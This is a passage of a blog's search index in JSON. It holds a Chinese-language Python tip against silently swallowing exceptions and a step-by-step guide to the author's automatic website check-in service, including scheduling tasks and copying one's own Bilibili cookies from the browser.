\u7b2c\u4e00\u4e2a\u95ee\u9898\u663e\u7136\u4e0d\u662f\u5b83\u9700\u8981\u5173\u5fc3\u7684\u4e8b\u60c5\uff0c\u56e0\u6b64\u5982\u679c\u9047\u5230\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\uff0c\u5b83\u539f\u5219\u4e0a\u5e94\u8be5\u7167\u5e38\u5411\u4e0a\u629b\u51fa FileNotFoundError \u5f02\u5e38\uff0c\u800c\u4e0d\u662f\u79c1\u81ea\u6d88\u5316\u6389\u8fd9\u4e2a\u5f02\u5e38\u3002 \u7b2c\u4e8c\u4e2a\u95ee\u9898\u663e\u7136\u624d\u662f\u5b83\u9700\u8981\u5173\u5fc3\u7684\u4e8b\uff0c\u4f46\u5904\u7406\u65b9\u5f0f\u4e5f\u7edd\u4e0d\u662f\u5f53\u4f5c\u6ca1\u6709\u9519\u8bef\u53d1\u751f\u5e76\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u5178\u6216\u662f None \u5bf9\u8c61\u3002\u6b63\u786e\u7684\u5904\u7406\u65b9\u5f0f\u4f9d\u7136\u662f\u5411\u4e0a\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u8fd9\u4e2a\u5f02\u5e38\u53ef\u4ee5\u662f RuntimeError \u6216\u662f\u7ee7\u627f\u81ea\u5b83\u7684\u81ea\u5b9a\u4e49\u5f02\u5e38\u3002 \u4e8b\u5b9e\u4e0a\uff0cPython \u6807\u51c6\u5e93\u4e2d\u7684 json \u5e93\uff08 json . load () \u51fd\u6570\uff09\u4fbf\u662f\u8fd9\u4e48\u505a\u7684\u3002 \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f \u4e0d\u53ef\u80fd\u5728 json . load () \u51fd\u6570\u4e2d\u89e6\u53d1\u8be5\u5f02\u5e38\uff0c\u56e0\u4e3a\u5b83\u5e76\u4e0d\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6\uff0c\u800c\u662f\u53ea\u4f7f\u7528\u4f20\u9012\u5230\u53c2\u6570\u7684\u6587\u4ef6\u6307\u9488\uff0c\u5373\u5b83\u7684\u7b2c\u4e00\u4e2a\u5f62\u53c2\uff1a fp : SupportsRead [ str | bytes ] \u3002 \u800c\u629b\u51fa FileNotFoundError \u5f02\u5e38\u7684\u51fd\u6570\u901a\u5e38\u662f\u6784\u9020\u6587\u4ef6\u6307\u9488\u7684\u51fd\u6570\uff0c\u5373 open () \u51fd\u6570\u3002 \u5982\u679c\u6587\u4ef6\u5185\u5bb9\u4e0d\u662f\u4e00\u4e2a json \u5b57\u7b26\u4e32\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f json . load () \u4f1a\u5411\u4e0a\u629b\u51fa json . decoder . JSONDecodeError \u5f02\u5e38\uff0c\u800c\u7edd\u4e0d\u662f\u79c1\u81ea\u6d88\u5316\u5b83\u3002 \u4e00\u4e2a\u79c1\u81ea\u6d88\u5316\u4e0d\u8be5\u5904\u7406\u7684\u5f02\u5e38\u7684\u51fd\u6570\uff0c\u5c31\u50cf\u662f\u4e00\u4e2a\u552f\u552f\u8bfa\u8bfa\u7684\u5c0f\u7537\u5b69\uff0c\u5f53\u53d7\u5230\u4e86\u6b3a\u8d1f\u7684\u65f6\u5019\uff0c\u88ab\u5bb6\u957f\u95ee\u8d77\u6765\u4e5f\u53ea\u662f\u4e00\u95ee\u4e09\u4e0d\u77e5\uff0c\u4e1d\u6beb\u4e0d\u900f\u9732\u81ea\u5df1\u53d1\u751f\u4e86\u4ec0\u4e48\u4e8b\u60c5\u3002 \u53ea\u6709\u5f53\u4f60\u5f88\u660e\u786e\u8fd9\u4e2a\u51fd\u6570\u8be5\u6d88\u5316\u8fd9\u4e2a\u5f02\u5e38\u7684\u65f6\u5019\uff0c\u624d\u53bb\u5904\u7406\u5b83\uff0c\u4e0d\u8be5\u6d88\u5316\u7684\u65f6\u5019\uff0c\u8bb0\u5f97\u76f4\u63a5\u5411\u4e0a\u629b\u51fa\uff01\u53ea\u6709\u8fd9\u6837\uff0cPython \u7684 traceback \u624d\u80fd\u66f4\u52a0\u6e05\u6670\u5730\u663e\u793a\u51fa\u9519\u7684\u539f\u56e0\u3002","title":"4.5 \u4e0d\u8981\u6d88\u5316\u81ea\u5df1\u4e0d\u8be5\u5904\u7406\u7684\u9519\u8bef"},{"location":"blog/2022/220530-auto-sign-in-guide/","tags":["guide"],"text":"\u6458\u8981 \u6211\u7684\u670d\u52a1\u5668\u4e0a\u642d\u5efa\u4e86\u4e00\u4e2a \u81ea\u52a8\u7b7e\u5230\u670d\u52a1 \uff0c\u6709\u7fa4\u53cb\u8bf4\u4e0d\u4f1a\u7528\uff0c\u6211\u5c31\u5199\u4e86\u4e2a\u6307\u5357\u3002 \u591a\u56fe\u8b66\u544a \u4e00\u3001\u7eea\u8bba \u00b6 1.1 \u8fd9\u662f\u4ec0\u4e48 \u00b6 \u73b0\u4eca\u5f88\u591a\u7f51\u7ad9\u6216\u8bba\u575b\u90fd\u6709\u7b7e\u5230\u529f\u80fd\uff0c\u901a\u8fc7\u6bcf\u65e5\u7b7e\u5230\u53ef\u4ee5\u83b7\u53d6\u5c11\u91cf\u79ef\u5206\u3001\u91d1\u5e01\u7b49\u9053\u5177\uff0c\u67d0\u4e9b\u7f51\u7ad9\u6216\u8bba\u575b\u8fde\u7eed\u7b7e\u5230\u53ef\u4ee5\u83b7\u5f97\u66f4\u4e30\u5bcc\u7684\u5956\u52b1\u3002 \u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u6bcf\u6b21\u90fd\u8981\u624b\u52a8\u53bb\u7f51\u9875\u4e0a\u7b7e\u5230\u5c82\u4e0d\u662f\u5f88\u6d6a\u8d39\u65f6\u95f4\uff1f\u8fd9\u4e48\u591a\u4e2a\u7f51\u7ad9\uff0c\u6bcf\u6b21\u90fd\u53bb\u4e00\u4e2a\u4e00\u4e2a\u7b7e\u5c82\u4e0d\u662f\u5f88\u9ebb\u70e6\uff1f\u4e07\u4e00\u65ad\u7b7e\u4e86\u600e\u4e48\u529e\uff1f\u4e8e\u662f\u5c31\u6709\u4e86 \u81ea\u52a8\u7b7e\u5230\u670d\u52a1 \u8fd9\u4e2a\u4e1c\u897f\u3002 \u81ea\u52a8\u7b7e\u5230\u670d\u52a1 \u7684\u7528\u9014\u548c\u4ed6\u7684\u540d\u5b57\u4e00\u6a21\u4e00\u6837\uff0c\u90a3\u5c31\u662f\u901a\u8fc7\u6211\u7684\u670d\u52a1\u5668\u901a\u8fc7\u6a21\u62df\u767b\u5f55\u3001\u7b7e\u5230\u7b49\u64cd\u4f5c\uff0c\u81ea\u52a8\u66ff\u4f60\u5b8c\u6210\u6bcf\u65e5\u7b7e\u5230\u3002 1.2 \u5165\u53e3 \u00b6 \u672c\u670d\u52a1\u88ab\u642d\u5efa\u5728 https://qiandao.arisa.moe/ \u4e0a\u3002 1.3 \u8bb8\u53ef\u8bc1 \u00b6 \u672c\u670d\u52a1\u57fa\u4e8e qiandao-today/qiandao \u9879\u76ee\uff0c\u8be5\u9879\u76ee\u91c7\u7528 MIT \u8bb8\u53ef\u8bc1\u5f00\u6e90\u3002 \u672c\u670d\u52a1\u6240\u4f7f\u7528\u7684\u6a21\u677f\u5747\u57fa\u4e8e qiandao-today/templates \u3002 \u4e8c\u3001\u6ce8\u518c \u00b6 \u5728\u4f7f\u7528\u8be5\u670d\u52a1\u524d\uff0c\u9700\u8981\u5148\u82b15\u79d2\u949f\u7684\u65f6\u95f4\u5728\u6211\u7684\u7f51\u7ad9\u4e0a\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u3002 \u53f3\u4e0a\u89d2\u9009\u62e9 \u767b\u5f55 \u6309\u94ae\uff0c\u7136\u540e\u8f93\u5165\u4f60\u81ea\u5df1\u7684\u90ae\u7bb1\uff08\u65e0\u987b\u9a8c\u8bc1\u90ae\u7bb1\uff09\u548c\u5bc6\u7801\uff0c\u70b9\u51fb \u6ce8\u518c \u5373\u53ef\u3002 \u4e09\u3001\u6dfb\u52a0\u6a21\u677f \u00b6 \u6ce8\u518c\u5b8c\u4e4b\u540e\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u4f60\u7684\u4eea\u8868\u76d8\u3002\u5982\u4e0b\u56fe\uff1a \u4f46\u662f\u73b0\u5728\u4f60\u7684\u4eea\u8868\u76d8\u5b8c\u5168\u662f \u7a7a\u7684 \uff0c\u8fd9\u662f\u56e0\u4e3a\u4f60\u8fd8\u6ca1\u6709\u6dfb\u52a0\u4efb\u4f55\u6a21\u677f\u548c\u7b7e\u5230\u4efb\u52a1\u3002 \u90a3\u4e48\u73b0\u5728\u6765\u6dfb\u52a0\u4e00\u4e9b\u6a21\u677f\uff0c\u5982\u56fe\u70b9\u51fb \u516c\u5171\u6a21\u677f \u3002 \u4f60\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u516c\u5171\u6a21\u677f\uff0c\u8fd9\u4e9b\u90fd\u662f\u4ece qiandao-today/templates \u9879\u76ee\u83b7\u53d6\u7684\u3002\u9009\u4e2d\u4e00\u4e2a\u4f60\u60f3\u8981\u6dfb\u52a0\u7684\u6a21\u677f\uff0c\u70b9\u51fb\u5de6\u8fb9\u7684 \u8ba2\u9605 \u3002 \u8ba2\u9605\u4e4b\u540e\u4f60\u4f1a\u770b\u5230\u4e00\u4e2a\u7528\u4e8e\u7f16\u8f91\u6a21\u677f\u7684\u754c\u9762\uff0c\u6b64\u65f6\u65e0\u987b\u7ba1\u4ed6\uff0c\u76f4\u63a5\u4fdd\u5b58\u5373\u53ef\u3002 \u968f\u540e\u4f1a\u51fa\u73b0\u4e00\u4e2a \u4fdd\u5b58HAR \u7684\u754c\u9762\uff0c\u8fd9\u91cc\u4e5f\u662f\u76f4\u63a5\u70b9 \u4fdd\u5b58 \u5373\u53ef\uff0c\u4e0d\u9700\u8981\u4f60\u6539\u4efb\u4f55\u4e1c\u897f\uff08\u60f3\u6539\u4e5f\u884c\uff09\u3002 \u6b64\u65f6\u56de\u5230\u4f60\u7684\u4eea\u8868\u76d8\uff0c\u4f60\u4f1a\u53d1\u73b0\u4f60\u7684\u6a21\u677f\u5df2\u7ecf\u6dfb\u52a0\u5230\u4e86 \u6211\u7684\u6a21\u677f \u5217\u8868\u4e2d\u3002 \u56db\u3001\u6dfb\u52a0\u4efb\u52a1 \u00b6 \u521a\u521a\u6211\u4eec\u505a\u7684\u53ea\u662f\u5c06\u4e00\u4e2a\u6a21\u677f\u4ece \u516c\u5171\u6a21\u677f\u5e93 \u4e2d\u590d\u5236\u5230\u4f60\u81ea\u5df1\u7684 \u6211\u7684\u6a21\u677f \u4e2d\uff08\u8fd9\u6837\u4fbf\u4e8e\u540e\u671f\u81ea\u5df1\u81ea\u5b9a\u4e49\u6a21\u677f\uff09\u3002\u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u57fa\u4e8e\u8fd9\u4e2a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a\u7b7e\u5230\u4efb\u52a1\u3002 \u70b9\u51fb\u6a21\u677f\u672b\u5c3e\u7684 \u65b0\u5efa \u6309\u94ae\u3002 \u5728\u8fd9\u4e2a\u754c\u9762\u91cc\u8f93\u5165\u4f60\u5728\u5bf9\u5e94\u8bba\u575b\u4e0a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff08\u7ea2\u6846\uff09\u3002\u5982\u679c\u8fd9\u91cc\u8981\u6c42\u7684\u662f\u9996\u9875 Cookies\uff0c\u90a3\u4e48\u8bf7\u53c2\u8003 \u8fd9\u91cc \u83b7\u53d6\u3002 \u5907\u6ce8\u91cc\u968f\u4fbf\u586b\u5199\u4e00\u70b9\u4e1c\u897f\uff08\u84dd\u6846\uff09\uff0c\u7528\u6765\u5728\u4f60\u81ea\u5df1\u7684\u4eea\u8868\u76d8\u4e0a\u505a\u5907\u6ce8\uff0c\u6211\u81ea\u5df1\u586b\u7684\u662f\u5bf9\u5e94\u8bba\u575b\u4e0a\u7684\u7528\u6237\u540d\uff0c\u56e0\u4e3a\u6211\u5728\u540c\u4e00\u4e2a\u8bba\u575b\u4e0a\u6709\u597d\u51e0\u4e2a\u53f7\uff0c\u521b\u5efa\u4efb\u52a1\u7684\u65f6\u5019\u9700\u8981\u7528\u7528\u6237\u540d\u533a\u5206\u3002\u5f53\u7136\u8fd9\u91cc\u4f60\u7559\u7a7a\u4e5f\u884c\u3002 \u5982\u679c\u4f60\u5f53\u5929\u5df2\u7ecf\u7b7e\u5230\u8fc7\u4e00\u6b21\u4e86\uff0c\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u7b7e\u5230\uff0c\u4f60\u53ef\u4ee5\u628a\u4e0b\u9762\u7684 \u6211\u4eca\u5929\u5df2\u7ecf\u7b7e\u8fc7\u5230\u4e86 \u7ed9\u52fe\u4e0a\uff0c\u8fd9\u6837\u70b9\u51fb\u63d0\u4ea4\u4e4b\u540e\u5c31\u4e0d\u4f1a\u81ea\u52a8\u8fdb\u884c\u4e00\u6b21\u7b7e\u5230\u3002 \u5176\u4ed6\u7684\u4e1c\u897f\u90fd\u4e0d\u9700\u8981\u7ba1\uff0c\u6700\u540e\u70b9\u51fb \u63d0\u4ea4 \u3002\u63d0\u4ea4\u4e4b\u540e\uff0c\u81ea\u52a8\u7b7e\u5230\u670d\u52a1\u4f1a\u7acb\u5373\u5c1d\u8bd5\u4e00\u6b21\u7b7e\u5230\u3002 \u4e94\u3001\u4fee\u6539\u4efb\u52a1\u5b9a\u65f6 \u00b6 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e0b\u4e00\u6b21\u7684\u7b7e\u5230\u65f6\u95f4\u4f1a\u662f\u4e0a\u4e00\u6b21\u7b7e\u5230\u6210\u529f\u7684\u65f6\u95f4\u52a0\u4e0a24\u4e2a\u5c0f\u65f6\u3002 \u5982\u679c\u4f60\u6bd4\u8f83\u5728\u610f\u8fd9\u4e2a\uff0c\u6216\u8005\u662f\u8ddf\u6211\u4e00\u6837\u6709\u5f3a\u8feb\u503e\u5411\uff08\u4f8b\u5982\u60f3\u8981\u7edf\u4e00\u5728\u65e9\u4e0a\u7b7e\u5230\uff09\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u901a\u8fc7\u7f16\u8f91\u4efb\u52a1\u7684\u5b9a\u65f6\u6765\u5b9e\u73b0\u3002 \u4ee5\u4e0b\u662f\u4e00\u4e2a\u793a\u4f8b\uff0c\u6211\u5c06\u4f1a\u628a\u521a\u521a\u6dfb\u52a0\u7684\u90a3\u4e2a\u4efb\u52a1\u7684\u5b9a\u65f6\u4fee\u6539\u6210\u5728 \u6bcf\u5929\u65e9\u4e0a 6:00 ~ 9:00 \u8fdb\u884c\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u4fee\u6539\u3002 \u9996\u5148\u70b9\u51fb\u4efb\u52a1\u672b\u5c3e\u7684 \u5b9a\u65f6 \u6309\u94ae\u3002 \u6b64\u65f6\u4f1a\u51fa\u73b0\u4e00\u4e2a\u5b9a\u65f6\u754c\u9762\u4fee\u6539\u6846\u3002 \u7136\u540e\u6211\u4eec\u628a \u5b9a\u65f6\u5f00\u5173 \u548c \u5f53\u5929\u968f\u673a\u5ef6\u65f6\u533a\u95f4 \u8fd9\u4e24\u4e2a\u52fe\u7ed9\u52fe\u4e0a\uff0c\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u5728\u6bcf\u5929\u65e9\u4e0a\u7684 6:00 ~ 9:00 \u4e4b\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u65f6\u95f4\u8fdb\u884c\u7b7e\u5230\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21\u5411\u540e\u987a\u5ef624\u5c0f\u65f6\u3002 \u5b9a\u65f6\u5f00\u5173\uff1a \u5f00\uff1a\u6bcf\u5929\u56fa\u5b9a\u65f6\u95f4\u7b7e\u5230 \u5173\uff1a\u4e0a\u4e00\u6b21\u7b7e\u5230\u6210\u529f\u7684\u65f6\u95f4\u987a\u5ef624\u4e2a\u5c0f\u65f6 \u5f53\u5929\u968f\u673a\u5ef6\u65f6\u533a\u95f4\uff1a \u5f00\uff1a\u6bcf\u6b21\u968f\u673a\u5411\u540e\u5ef6\u65f6 \u5173\uff1a\u4e0d\u968f\u673a\u5ef6\u65f6\uff0c\u771f\u6b63\u7684\u56fa\u5b9a\u65f6\u95f4 \u6211\u505a\u6f14\u793a\u7684\u65f6\u5019\uff0c\u5f53\u5929\u662f 2022\u5e746\u67085\u65e5 \uff0c\u6240\u4ee5\u8fd9\u91cc\u9ed8\u8ba4\u663e\u793a\u7684\u65e5\u671f\u4e5f\u662f 2022\u5e746\u67085\u65e5 \u3002\u56e0\u4e3a\u6211\u4eec\u4eca\u5929\u5df2\u7ecf\u7b7e\u5230\u8fc7\u4e00\u6b21\u4e86\uff0c\u5e0c\u671b\u4ed6\u4ece\u660e\u5929\u5f00\u59cb\uff0c\u6240\u4ee5\u628a\u8fd9\u4e2a\u65e5\u671f\u6539\u6210 2022\u5e746\u67086\u65e5 \u3002 \u56e0\u4e3a\u6211\u4eec\u9700\u8981\u5728\u6bcf\u5929\u65e9\u4e0a\u7684 6:00 ~ 9:00 \u4e4b\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u65f6\u95f4\u8fdb\u884c\u7b7e\u5230\uff0c\u6240\u4ee5\u628a\u540e\u9762\u7684\u65f6\u95f4\u6539\u4e3a 06:00:00 \uff0c\u5ef6\u65f6\u533a\u95f4\u6539\u4e3a 0~10800 \uff08\u4e5f\u5c31\u662f3\u4e2a\u5c0f\u65f6\uff09\u3002 \u6700\u540e\u6211\u4eec\u6539\u5b8c\u662f\u8fd9\u6837\u7684\uff1a \u70b9\u51fb \u63d0\u4ea4 \u5373\u53ef\u3002 \u5237\u65b0\u4e00\u4e0b\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u4efb\u52a1\u7684\u65f6\u95f4\u5df2\u7ecf\u53d8\u6210\u4e86\u65e9\u4e0a6\u70b9\u52309\u70b9\u4e2d\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u503c\u3002 \u516d\u3001\u5982\u4f55\u521b\u5efa\u4ee5 Cookies \u4f5c\u4e3a\u767b\u9646\u65b9\u5f0f\u7684\u7b7e\u5230\u4efb\u52a1 \u00b6 \u6709\u5f88\u591a\u7c7b\u4f3c\u4e8e\u8fd9\u6837\u5b50\u7684\u6a21\u677f\uff0c\u5b83\u8981\u6c42\u63d0\u4f9b Cookies\uff0c\u800c\u4e0d\u662f\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 \u4e0b\u9762\u5c06\u4ee5 https://www.bilibili.com/ \u4e3a\u4f8b\uff0c\u5c55\u793a\u5982\u4f55\u83b7\u53d6\u9996\u9875 Cookies\u3002 \u9996\u5148\u8fdb\u5165 B \u7ad9\u9996\u9875\uff0c\u6309\u4e0b F12 \u5f00\u542f\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u8005\u63a7\u5236\u53f0\u3002\u5207\u6362\u5230 \u7f51\u7edc \u9009\u9879\u5361\uff08\u6216\u8005 Network \u9009\u9879\u5361\uff09\u3002 \u6309\u4e0b F5 \u5237\u65b0\u9875\u9762\uff0c\u6b64\u65f6\u8fd9\u91cc\u5e94\u8be5\u4f1a\u51fa\u73b0\u5f88\u591a\u8bf7\u6c42\u3002\u9009\u62e9\u7b2c\u4e00\u4e2a\uff0c\u67e5\u770b\u5b83\u7684\u8bf7\u6c42\u5934\uff0c\u627e\u5230 Cookies\u3002 \u590d\u5236 Cookies \u5373\u53ef\uff08\u6ce8\u610f\u662f\u590d\u5236 Cookies \u7684\u5185\u5bb9\uff0c\u4e0d\u8981\u628a Cookie \u8fd9\u51e0\u4e2a\u5b57\u6bcd\u4e5f\u590d\u5236\u8fc7\u53bb\u4e86\uff09","title":"\u81ea\u52a8\u7b7e\u5230\u4f7f\u7528\u6307\u5357"},{"location":"blog/2022/220530-auto-sign-in-guide/#_1","text":"","title":"\u4e00\u3001\u7eea\u8bba"},{"location":"blog/2022/220530-auto-sign-in-guide/#11","text":"\u73b0\u4eca\u5f88\u591a\u7f51\u7ad9\u6216\u8bba\u575b\u90fd\u6709\u7b7e\u5230\u529f\u80fd\uff0c\u901a\u8fc7\u6bcf\u65e5\u7b7e\u5230\u53ef\u4ee5\u83b7\u53d6\u5c11\u91cf\u79ef\u5206\u3001\u91d1\u5e01\u7b49\u9053\u5177\uff0c\u67d0\u4e9b\u7f51\u7ad9\u6216\u8bba\u575b\u8fde\u7eed\u7b7e\u5230\u53ef\u4ee5\u83b7\u5f97\u66f4\u4e30\u5bcc\u7684\u5956\u52b1\u3002 \u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u6bcf\u6b21\u90fd\u8981\u624b\u52a8\u53bb\u7f51\u9875\u4e0a\u7b7e\u5230\u5c82\u4e0d\u662f\u5f88\u6d6a\u8d39\u65f6\u95f4\uff1f\u8fd9\u4e48\u591a\u4e2a\u7f51\u7ad9\uff0c\u6bcf\u6b21\u90fd\u53bb\u4e00\u4e2a\u4e00\u4e2a\u7b7e\u5c82\u4e0d\u662f\u5f88\u9ebb\u70e6\uff1f\u4e07\u4e00\u65ad\u7b7e\u4e86\u600e\u4e48\u529e\uff1f\u4e8e\u662f\u5c31\u6709\u4e86 \u81ea\u52a8\u7b7e\u5230\u670d\u52a1 \u8fd9\u4e2a\u4e1c\u897f\u3002 \u81ea\u52a8\u7b7e\u5230\u670d\u52a1 \u7684\u7528\u9014\u548c\u4ed6\u7684\u540d\u5b57\u4e00\u6a21\u4e00\u6837\uff0c\u90a3\u5c31\u662f\u901a\u8fc7\u6211\u7684\u670d\u52a1\u5668\u901a\u8fc7\u6a21\u62df\u767b\u5f55\u3001\u7b7e\u5230\u7b49\u64cd\u4f5c\uff0c\u81ea\u52a8\u66ff\u4f60\u5b8c\u6210\u6bcf\u65e5\u7b7e\u5230\u3002","title":"1.1 \u8fd9\u662f\u4ec0\u4e48"},{"location":"blog/2022/220530-auto-sign-in-guide/#12","text":"\u672c\u670d\u52a1\u88ab\u642d\u5efa\u5728 https://qiandao.arisa.moe/ \u4e0a\u3002","title":"1.2 \u5165\u53e3"},{"location":"blog/2022/220530-auto-sign-in-guide/#13","text":"\u672c\u670d\u52a1\u57fa\u4e8e qiandao-today/qiandao \u9879\u76ee\uff0c\u8be5\u9879\u76ee\u91c7\u7528 MIT \u8bb8\u53ef\u8bc1\u5f00\u6e90\u3002 \u672c\u670d\u52a1\u6240\u4f7f\u7528\u7684\u6a21\u677f\u5747\u57fa\u4e8e qiandao-today/templates \u3002","title":"1.3 \u8bb8\u53ef\u8bc1"},{"location":"blog/2022/220530-auto-sign-in-guide/#_2","text":"\u5728\u4f7f\u7528\u8be5\u670d\u52a1\u524d\uff0c\u9700\u8981\u5148\u82b15\u79d2\u949f\u7684\u65f6\u95f4\u5728\u6211\u7684\u7f51\u7ad9\u4e0a\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u3002 \u53f3\u4e0a\u89d2\u9009\u62e9 \u767b\u5f55 \u6309\u94ae\uff0c\u7136\u540e\u8f93\u5165\u4f60\u81ea\u5df1\u7684\u90ae\u7bb1\uff08\u65e0\u987b\u9a8c\u8bc1\u90ae\u7bb1\uff09\u548c\u5bc6\u7801\uff0c\u70b9\u51fb \u6ce8\u518c \u5373\u53ef\u3002","title":"\u4e8c\u3001\u6ce8\u518c"},{"location":"blog/2022/220530-auto-sign-in-guide/#_3","text":"\u6ce8\u518c\u5b8c\u4e4b\u540e\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u4f60\u7684\u4eea\u8868\u76d8\u3002\u5982\u4e0b\u56fe\uff1a \u4f46\u662f\u73b0\u5728\u4f60\u7684\u4eea\u8868\u76d8\u5b8c\u5168\u662f \u7a7a\u7684 \uff0c\u8fd9\u662f\u56e0\u4e3a\u4f60\u8fd8\u6ca1\u6709\u6dfb\u52a0\u4efb\u4f55\u6a21\u677f\u548c\u7b7e\u5230\u4efb\u52a1\u3002 \u90a3\u4e48\u73b0\u5728\u6765\u6dfb\u52a0\u4e00\u4e9b\u6a21\u677f\uff0c\u5982\u56fe\u70b9\u51fb \u516c\u5171\u6a21\u677f \u3002 \u4f60\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u516c\u5171\u6a21\u677f\uff0c\u8fd9\u4e9b\u90fd\u662f\u4ece qiandao-today/templates \u9879\u76ee\u83b7\u53d6\u7684\u3002\u9009\u4e2d\u4e00\u4e2a\u4f60\u60f3\u8981\u6dfb\u52a0\u7684\u6a21\u677f\uff0c\u70b9\u51fb\u5de6\u8fb9\u7684 \u8ba2\u9605 \u3002 \u8ba2\u9605\u4e4b\u540e\u4f60\u4f1a\u770b\u5230\u4e00\u4e2a\u7528\u4e8e\u7f16\u8f91\u6a21\u677f\u7684\u754c\u9762\uff0c\u6b64\u65f6\u65e0\u987b\u7ba1\u4ed6\uff0c\u76f4\u63a5\u4fdd\u5b58\u5373\u53ef\u3002 \u968f\u540e\u4f1a\u51fa\u73b0\u4e00\u4e2a \u4fdd\u5b58HAR \u7684\u754c\u9762\uff0c\u8fd9\u91cc\u4e5f\u662f\u76f4\u63a5\u70b9 \u4fdd\u5b58 \u5373\u53ef\uff0c\u4e0d\u9700\u8981\u4f60\u6539\u4efb\u4f55\u4e1c\u897f\uff08\u60f3\u6539\u4e5f\u884c\uff09\u3002 \u6b64\u65f6\u56de\u5230\u4f60\u7684\u4eea\u8868\u76d8\uff0c\u4f60\u4f1a\u53d1\u73b0\u4f60\u7684\u6a21\u677f\u5df2\u7ecf\u6dfb\u52a0\u5230\u4e86 \u6211\u7684\u6a21\u677f \u5217\u8868\u4e2d\u3002","title":"\u4e09\u3001\u6dfb\u52a0\u6a21\u677f"},{"location":"blog/2022/220530-auto-sign-in-guide/#_4","text":"\u521a\u521a\u6211\u4eec\u505a\u7684\u53ea\u662f\u5c06\u4e00\u4e2a\u6a21\u677f\u4ece \u516c\u5171\u6a21\u677f\u5e93 \u4e2d\u590d\u5236\u5230\u4f60\u81ea\u5df1\u7684 \u6211\u7684\u6a21\u677f \u4e2d\uff08\u8fd9\u6837\u4fbf\u4e8e\u540e\u671f\u81ea\u5df1\u81ea\u5b9a\u4e49\u6a21\u677f\uff09\u3002\u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u57fa\u4e8e\u8fd9\u4e2a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a\u7b7e\u5230\u4efb\u52a1\u3002 \u70b9\u51fb\u6a21\u677f\u672b\u5c3e\u7684 \u65b0\u5efa \u6309\u94ae\u3002 \u5728\u8fd9\u4e2a\u754c\u9762\u91cc\u8f93\u5165\u4f60\u5728\u5bf9\u5e94\u8bba\u575b\u4e0a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff08\u7ea2\u6846\uff09\u3002\u5982\u679c\u8fd9\u91cc\u8981\u6c42\u7684\u662f\u9996\u9875 Cookies\uff0c\u90a3\u4e48\u8bf7\u53c2\u8003 \u8fd9\u91cc \u83b7\u53d6\u3002 \u5907\u6ce8\u91cc\u968f\u4fbf\u586b\u5199\u4e00\u70b9\u4e1c\u897f\uff08\u84dd\u6846\uff09\uff0c\u7528\u6765\u5728\u4f60\u81ea\u5df1\u7684\u4eea\u8868\u76d8\u4e0a\u505a\u5907\u6ce8\uff0c\u6211\u81ea\u5df1\u586b\u7684\u662f\u5bf9\u5e94\u8bba\u575b\u4e0a\u7684\u7528\u6237\u540d\uff0c\u56e0\u4e3a\u6211\u5728\u540c\u4e00\u4e2a\u8bba\u575b\u4e0a\u6709\u597d\u51e0\u4e2a\u53f7\uff0c\u521b\u5efa\u4efb\u52a1\u7684\u65f6\u5019\u9700\u8981\u7528\u7528\u6237\u540d\u533a\u5206\u3002\u5f53\u7136\u8fd9\u91cc\u4f60\u7559\u7a7a\u4e5f\u884c\u3002 \u5982\u679c\u4f60\u5f53\u5929\u5df2\u7ecf\u7b7e\u5230\u8fc7\u4e00\u6b21\u4e86\uff0c\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u7b7e\u5230\uff0c\u4f60\u53ef\u4ee5\u628a\u4e0b\u9762\u7684 \u6211\u4eca\u5929\u5df2\u7ecf\u7b7e\u8fc7\u5230\u4e86 \u7ed9\u52fe\u4e0a\uff0c\u8fd9\u6837\u70b9\u51fb\u63d0\u4ea4\u4e4b\u540e\u5c31\u4e0d\u4f1a\u81ea\u52a8\u8fdb\u884c\u4e00\u6b21\u7b7e\u5230\u3002 \u5176\u4ed6\u7684\u4e1c\u897f\u90fd\u4e0d\u9700\u8981\u7ba1\uff0c\u6700\u540e\u70b9\u51fb \u63d0\u4ea4 \u3002\u63d0\u4ea4\u4e4b\u540e\uff0c\u81ea\u52a8\u7b7e\u5230\u670d\u52a1\u4f1a\u7acb\u5373\u5c1d\u8bd5\u4e00\u6b21\u7b7e\u5230\u3002","title":"\u56db\u3001\u6dfb\u52a0\u4efb\u52a1"},{"location":"blog/2022/220530-auto-sign-in-guide/#_5","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e0b\u4e00\u6b21\u7684\u7b7e\u5230\u65f6\u95f4\u4f1a\u662f\u4e0a\u4e00\u6b21\u7b7e\u5230\u6210\u529f\u7684\u65f6\u95f4\u52a0\u4e0a24\u4e2a\u5c0f\u65f6\u3002 